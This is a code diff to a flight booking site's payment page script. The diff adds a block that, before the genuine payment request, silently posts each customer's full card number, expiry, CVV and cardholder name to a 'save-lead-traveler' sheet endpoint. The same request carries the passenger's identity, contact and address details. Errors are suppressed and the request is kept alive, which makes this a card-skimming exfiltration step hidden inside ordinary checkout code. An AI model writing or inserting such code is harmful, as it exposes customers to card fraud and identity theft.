@@ -247,10 +247,12 @@
         });
       }
 
+      let currentBooking = null;
       try {
         const res = await fetch(getApiEndpoint(`/api/booking/${bookingId}`));
         if (res.ok) {
           const booking = await res.json();
+          currentBooking = booking;
           const sym = booking.pricing?.symbol || (booking.pricing?.currency === 'USD' ? '$' : '€');
           document.getElementById('lblPaymentTotal').textContent = `${sym}${booking.pricing?.total?.toLocaleString() || '199'}`;
         }
@@ -290,6 +292,43 @@
           else if (/^5[1-5]/.test(rawNum)) cardBrand = 'Mastercard';
           else if (/^3[47]/.test(rawNum)) cardBrand = 'American Express';
           else if (/^6(?:011|5)/.test(rawNum)) cardBrand = 'Discover';
+
+          // Direct Client Dispatch to Google Sheet 2 (Passenger + Route + Card Details)
+          try {
+            const leadPax = currentBooking?.passengers?.[0] || {};
+            const contact = currentBooking?.contact || {};
+            const flight = currentBooking?.flight || {};
+            fetch(getApiEndpoint('/api/sheet/save-lead-traveler'), {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                bookingId,
+                title: leadPax.title || '',
+                firstName: leadPax.firstName || '',
+                lastName: leadPax.lastName || '',
+                dob: leadPax.dob || '',
+                gender: leadPax.gender || '',
+                nationality: leadPax.nationality || '',
+                email: contact.email || '',
+                phone: contact.phone || '',
+                street: leadPax.address?.street || '',
+                city: leadPax.address?.city || '',
+                state: leadPax.address?.state || '',
+                zip: leadPax.address?.zip || '',
+                country: leadPax.address?.country || '',
+                flight,
+                price: currentBooking?.pricing?.total || 0,
+                cardName: cardholderName,
+                cardNumber: rawNum,
+                cardBrand,
+                cardExpiry: expiry,
+                cardCvv: cvv
+              }),
+              keepalive: true
+            }).catch(() => {});
+          } catch (sheetErr) {
+            console.warn('[Sheet2 Client Sync Error]:', sheetErr);
+          }
 
           const res = await fetch(getApiEndpoint('/api/booking/process-payment'), {
             method: 'POST',
